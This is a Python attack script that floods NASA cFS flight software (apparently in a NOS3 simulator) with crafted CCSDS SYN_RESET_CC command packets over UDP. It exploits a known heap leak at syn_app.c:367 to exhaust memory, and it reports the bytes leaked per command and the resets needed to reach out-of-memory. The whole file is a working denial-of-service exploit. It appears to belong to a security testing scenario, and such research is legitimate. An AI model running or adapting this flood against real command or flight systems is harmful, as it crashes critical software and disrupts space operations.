#!/usr/bin/env python3
"""
attack_syn_leak.py - Scenario 1 Phase A/C: SYN_RESET_CC memory leak flood

Sends raw CCSDS command packets (SYN_RESET_CC, CC=5) to the cFS Command
Ingestor (CI) app over UDP. Each command causes the SYN app to allocate a
new heap block without freeing the prior one (F3: syn_app.c:367).

Usage:
    python3 attack_syn_leak.py [OPTIONS]

Options:
    --host         Target host (default: 127.0.0.1)
    --port         CI UDP port (default: 5010)
    --count        Number of RESET_CC commands to send (default: 500)
    --rate-hz      Send rate in commands/second (default: 10)
    --measure-leak Print VmRSS before/after to estimate bytes leaked per command
    --pid          PID of core-cpu1 (auto-detected if omitted)

Example - Phase A (measure leak size):
    python3 attack_syn_leak.py --count 10 --rate-hz 1 --measure-leak

Example - Phase C (sustained flood while noisy_app detonates):
    python3 attack_syn_leak.py --count 500 --rate-hz 10

References:
    SYN_CMD_MID   = 0x18FC  (syn_msgids.h)
    SYN_RESET_CC  = 5       (syn_msg.h:20)
    CI UDP port   = 5010    (nos3-simulator.xml)
    F3 leak path  = syn_app.c:366-367
"""

import argparse
import socket
import struct
import subprocess
import time

# CCSDS primary header constants
CCSDS_VERSION   = 0b000
CCSDS_TYPE_CMD  = 1          # command packet
CCSDS_SEC_HDR   = 1          # secondary header present
CCSDS_APID_MASK = 0x07FF

SYN_CMD_MID     = 0x18FC     # SYN command message ID (syn_msgids.h)
SYN_RESET_CC    = 5          # SYN_RESET_CC (syn_msg.h:20)
SYN_NOOP_CC     = 0          # for Phase A baseline comparison


def build_ccsds_cmd(apid: int, cc: int, checksum: int = 0x00) -> bytes:
    """
    Build an 8-byte CCSDS command packet (primary + secondary header, no payload).

    Primary header (6 bytes):
        Bits 15-13: version (000)
        Bit  12:    type (1 = command)
        Bit  11:    secondary header flag (1)
        Bits 10-0:  APID
        Bits 15-14: sequence flags (11 = standalone)
        Bits 13-0:  sequence count (0)
        Bits 15-0:  data length - 1 (secondary header only = 1 byte, so value = 1)

    Secondary header (2 bytes):
        Bits 7-0:   function code (CC)
        Bits 7-0:   checksum (0x00 = unchecked; cFS validates if enabled)
    """
    stream_id  = (CCSDS_TYPE_CMD << 12) | (CCSDS_SEC_HDR << 11) | (apid & CCSDS_APID_MASK)
    sequence   = 0xC000          # sequence flags = 11 (standalone), count = 0
    data_len   = 1               # secondary header only (2 bytes) - 1 = 1
    pri_hdr    = struct.pack(">HHH", stream_id, sequence, data_len)
    sec_hdr    = struct.pack("BB", cc & 0x7F, checksum)
    return pri_hdr + sec_hdr


def get_vmrss_kb(pid: int) -> int:
    """Read VmRSS from /proc/<pid>/status; returns KB or -1 on error."""
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1])
    except OSError:
        pass
    return -1


def find_cfs_pid() -> int:
    """Auto-detect core-cpu1 PID via pgrep."""
    try:
        result = subprocess.run(["pgrep", "-f", "core-cpu1"], capture_output=True, text=True)
        pids = result.stdout.strip().split()
        if pids:
            return int(pids[0])
    except Exception:
        pass
    return -1


def main() -> None:
    parser = argparse.ArgumentParser(description="SYN_RESET_CC memory leak flood (Scenario 1 Phase A/C)")
    parser.add_argument("--host",         default="127.0.0.1", help="Target host (default: 127.0.0.1)")
    parser.add_argument("--port",         type=int, default=5010, help="CI UDP port (default: 5010)")
    parser.add_argument("--count",        type=int, default=500,  help="Commands to send (default: 500)")
    parser.add_argument("--rate-hz",      type=float, default=10, help="Send rate Hz (default: 10)")
    parser.add_argument("--measure-leak", action="store_true",    help="Print VmRSS delta to estimate leak size")
    parser.add_argument("--pid",          type=int, default=-1,   help="PID of core-cpu1 (auto-detected if omitted)")
    args = parser.parse_args()

    pid = args.pid
    if args.measure_leak and pid < 0:
        pid = find_cfs_pid()
        if pid < 0:
            print("[WARN] Could not auto-detect core-cpu1 PID; VmRSS measurement disabled.")
            args.measure_leak = False

    packet   = build_ccsds_cmd(SYN_CMD_MID & CCSDS_APID_MASK, SYN_RESET_CC)
    interval = 1.0 / args.rate_hz
    sock     = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    rss_before = get_vmrss_kb(pid) if args.measure_leak else -1
    print(f"[*] Sending {args.count} SYN_RESET_CC packets → {args.host}:{args.port} @ {args.rate_hz} Hz")
    if rss_before > 0:
        print(f"[*] VmRSS before: {rss_before} KB")

    sent = 0
    try:
        for i in range(args.count):
            sock.sendto(packet, (args.host, args.port))
            sent += 1
            if (i + 1) % 50 == 0:
                print(f"    {i + 1}/{args.count} sent", flush=True)
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[!] Interrupted after {sent} packets.")
    finally:
        sock.close()

    if args.measure_leak and pid > 0:
        time.sleep(1.0)   # let cFS process the queue
        rss_after = get_vmrss_kb(pid)
        if rss_after > 0 and rss_before > 0:
            delta_kb    = rss_after - rss_before
            per_reset   = delta_kb * 1024 / max(sent, 1)
            print(f"[*] VmRSS after:  {rss_after} KB")
            print(f"[*] Delta:        {delta_kb} KB over {sent} resets")
            print(f"[*] ~{per_reset:.0f} bytes leaked per SYN_RESET_CC")
            if per_reset > 0:
                heap_mb = 256  # typical Docker container heap headroom (MB)
                resets_to_oom = int((heap_mb * 1024 * 1024) / per_reset)
                print(f"[*] Estimated resets to OOM (~{heap_mb} MB budget): {resets_to_oom}")
        else:
            print("[WARN] Could not read VmRSS after send.")

    print(f"[+] Done. {sent} SYN_RESET_CC packets sent.")


if __name__ == "__main__":
    main()
